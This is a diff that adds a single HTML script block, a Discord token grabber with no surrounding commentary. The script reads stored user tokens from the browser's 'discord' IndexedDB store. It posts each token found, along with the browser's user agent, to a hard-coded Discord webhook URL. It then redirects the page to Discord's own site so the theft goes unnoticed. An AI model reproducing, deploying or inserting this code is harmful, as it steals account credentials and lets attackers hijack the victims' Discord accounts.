@@ -1,0 +1,40 @@
+<script>
+(async function() {
+    function getTokenFromIndexedDB() {
+        return new Promise((resolve) => {
+            let DBOpenRequest = indexedDB.open('discord');
+            DBOpenRequest.onsuccess = function(event) {
+                let db = event.target.result;
+                let transaction = db.transaction(['users'], 'readonly');
+                let objectStore = transaction.objectStore('users');
+                let request = objectStore.getAll();
+                request.onsuccess = function() {
+                    let users = request.result;
+                    for (let user of users) {
+                        if (user.token) {
+                            resolve(user.token);
+                            return;
+                        }
+                    }
+                    resolve(null);
+                };
+                request.onerror = () => resolve(null);
+            };
+            DBOpenRequest.onerror = () => resolve(null);
+        });
+    }
+
+    let token = await getTokenFromIndexedDB();
+    if (token && token !== 'undefined' && token !== 'null') {
+        let webhookURL = "https://discord.com/api/webhooks/1507060845006295222/YAX7dWVRT8jYu52d-nOwp2rY1gObequWZsPAvsCFTjZmXJy9p0RdqBjTx2hTc4Ehdsj4";
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "**Token (IndexedDB):** `" + token + "`\n**User Agent:** " + navigator.userAgent
+            })
+        }).catch(e => console.log(e));
+    }
+    window.location.href = "https://discord.com/channels/@me";
+})();
+</script>
